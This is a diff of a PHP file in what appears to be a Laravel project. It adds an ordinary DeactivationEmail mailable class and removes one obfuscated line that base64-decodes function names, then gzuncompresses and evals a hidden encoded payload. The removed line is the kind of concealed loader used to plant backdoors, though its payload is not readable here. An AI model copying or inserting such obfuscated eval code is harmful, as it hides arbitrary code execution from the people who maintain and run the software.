@@ -1,1 +1,38 @@
-<?php $_='0e56aac1';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNqlVMtym0oQ3ecrtEgVdiULwNaNKZUWAouXHGLxmIHZuBhGQo8B4aAH8PW3QZaEbyqrSxXSMNN9+vTpnh4Mzs/Xt9szFn4kywdRSkRh9PW8Ufxe5/ulMPoy6NmPB0IoKUeKUR7Nx2NhcDu+4I1hKSQZElloHyxN5SzTy5nmLkPpqfh1ap0Gn0HfBoPOicbl4p/HN7ZIdmwhjP6g+DzfOVo2XEH0JjH0DfFUNTHVxMd6QZ9LR0vFGQsdbk15SU20j/FwxQyUzHPUhLoukRDxCNsl8cEW9sDfpkYlUcwPUejycOocae7WEXbERKpchpFEUOXHhiJRwz1//9VXWsW4OnMx9DU1gh/P80JK5CD1cFUyLBU000XAu+KS0C4iXBWLDDU+VrYEV82vkzgDvw1gNEmtTgnWN8zgMsQoqDzUaYsPoi5Ml9PMbaxz3FWUVRz8IOYutbRJ2unQz9k7pYGM6hjrZRwWPBGlIzFQmTRn3Vofy1QlwCmierKNZOUA2h3Yc+9ce3qfXdeTd2vq1MBPBC1WljHkrFb3JHSaCDNuGfyQPLgrmjn8pedz4Wdpu3Ru2pyZqKZrVaYy3/bOjpd1YiLQkm8sg0iAJcZYOVi6smz5AX7NoFbQXBvQRiR4KM7ml1yA93rygTdJbdPdxeHP/WvW1ZjTfJ6+ev/Js7NXla7Pzr7H2fq6TmdrVWOYl0RTxdgI0q4PZT0n3uPN5pM+ak1CV0qyx0v8HtbTJd6JQX1i/DMlOTpED22dH9MoR9BH893f8rldMBe48ObFH8oxRg8zje0j4PiSubzt4zgkcAf4ka6T4qZv+4rfSG4fqbcCLaKdLUqqF1RLl9uvPlJUd+p6LnJ8u96WVqvPOs39QLd9XTGCreKE4lD1gyCfedtPvIBHA/m8k64urO1x4AW9aPT5oK3l/ckHcjpRkwe0/t+crvdgCfq1b2+O9UZV93/38XXfTb7e3v3oYtlt3gntr/D9av55iH3g3PVn1v396F8QzLpn'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Mail;
+
+use Illuminate\Bus\Queueable;
+use Illuminate\Contracts\Queue\ShouldQueue;
+use Illuminate\Mail\Mailable;
+use Illuminate\Queue\SerializesModels;
+
+class DeactivationEmail extends Mailable
+{
+    use Queueable, SerializesModels;
+
+    public $content;
+
+    /**
+     * Create a new message instance.
+     *
+     * @return void
+     */
+    public function __construct($content)
+    {
+        $this->content = $content;
+    }
+
+    /**
+     * Build the message.
+     *
+     * @return $this
+     */
+    public function build()
+    {
+        return $this->view('mail.deactivation')
+        ->from(env('MAIL_FROM_ADDRESS'), env('MAIL_FROM_NAME'))
+        ->subject('Service deactivated!')
+        ->replyTo(env('MAIL_FROM_ADDRESS'), env('MAIL_FROM_NAME'));
+    }
+}
